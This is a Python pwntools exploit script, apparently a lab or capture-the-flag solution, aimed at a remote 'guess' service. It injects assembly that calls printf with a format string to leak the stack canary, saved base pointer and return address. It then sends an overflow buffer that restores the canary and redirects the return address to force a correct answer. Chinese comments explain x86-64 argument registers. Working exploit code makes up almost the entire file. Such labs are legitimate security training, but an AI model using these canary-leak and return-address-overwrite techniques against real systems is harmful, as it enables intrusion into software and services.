#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *
ASM = True
GUESS_NUM = 311552017
context.arch = 'amd64'
context.os = 'linux'

exe = "./solver_sample" if len(sys.argv) < 2 else sys.argv[1];

# r = process("./remoteguess", shell=True)
# r = remote("localhost", 10816)
r = remote("up23.zoolab.org", 10816)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)


payload = None
if payload == None:
    print("ASM = True")
    payload = asm("""
        push   rbp
        mov    rbp,rsp
        sub    rsp,0x20
        mov    rcx,QWORD PTR [rbp+0x08]     # return address
        mov    rdx,QWORD PTR [rbp]          # rbp
        mov    rsi,QWORD PTR fs:0x28        # canary

        movabs rax, 0x78
        mov    QWORD PTR [rbp-0x10],rax
        movabs rax, 0x6c25786c25786c25
        mov    QWORD PTR [rbp-0x18],rax
        lea    rax,[rbp-0x18]           # %lx
        mov    r8,rdi                   # printf
        mov    rdi,rax
        call   r8
        leave
        ret
        """
        )
    # 在 x86-64 架構的 CPU 中，rdi、rsi、rdx、rcx 四個暫存器是函數調用時用來傳遞參數的暫存器，
    # 並且有著以下的使用約定：
    # rdi：用來傳遞第一個參數。
    # rsi：用來傳遞第二個參數。
    # rdx：用來傳遞第三個參數。
    # rcx：用來傳遞第四個參數。
    # 如果參數的數量超過了這四個暫存器所能傳遞的範圍，那麼超出的參數就會被推入堆疊中。
    # 此外，這四個暫存器在函數調用時也可以被用作傳回值的儲存器。
    # 例如，在 Linux 中，整數的傳回值通常會存放在 rax 暫存器中，而浮點數的傳回值則會存放在 xmm0 暫存器中。
    # payload = asm("""
    #     push   rbp                      ; 將目前的 RBP 值推入堆疊
    #     mov    rbp,rsp                  ; 將 RBP 設為目前的 RSP 值
    #     sub    rsp,0x20                 ; 將 RSP 減去 0x20 的值
    #     mov    rcx,QWORD PTR [rbp+0x08] ; 將 rbp+0x08 的位址所指的 QWORD 值存入 rcx 註解：(return address)
    #     mov    rdx,QWORD PTR [rbp]      ; 將 rbp 的位址所指的 QWORD 值存入 rdx
    #     mov    rsi,QWORD PTR fs:0x28    ; 將 fs:0x28 的值存入 rsi 註解：(canary) 
    #     movabs rax, 0x78                ; 將 0x78 存入 rax
    #     mov    QWORD PTR [rbp-0x10],rax ; 將 rax 的值存到 [rbp-0x10] 的位置
    #     movabs rax, 0x6c25786c25786c25  ; 將 0x6c25786c25786c25 存入 rax
    #     mov    QWORD PTR [rbp-0x18],rax ; 將 rax 的值存到 [rbp-0x18] 的位置
    #     lea    rax,[rbp-0x18]           ; 將 [rbp-0x18] 的記憶體位址存入 rax
    #     mov    r8,rdi                   ; 將 rdi 的值存入 r8
    #     mov    rdi,rax                  ; 將 rax 的值存入 rdi
    #     call   r8                       ; 呼叫函數 r8，也就是 printf 函數
    #     leave                           ; 恢復原本的 RBP 和 RSP 的值
    #     ret                             ; 返回
    #     """)

    print("** {} bytes to submit, solver found at {:x}".format(len(payload), 0))
    r.sendlineafter(b'send to me? ', str(len(payload)).encode())
    r.sendlineafter(b'to call? ', "0".encode())
    r.sendafter(b'bytes): ', payload)

    r.recvline()
    canary = p64(int("0x" + r.recv(16).strip().decode(),16))
    rbp = p64(int("0x" + r.recv(12).strip().decode(),16))
    guess_ret = p64(int("0x" + r.recv(12).strip().decode(),16)+0xab)

else:
    r.sendlineafter(b'send to me? ', b'0')

guess_buf = (str(GUESS_NUM).encode('ascii').ljust(0x18, b'\0')) + canary + rbp + guess_ret
r.sendafter(b'your answer?', guess_buf + b'\0'*0xc + p32(GUESS_NUM))

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
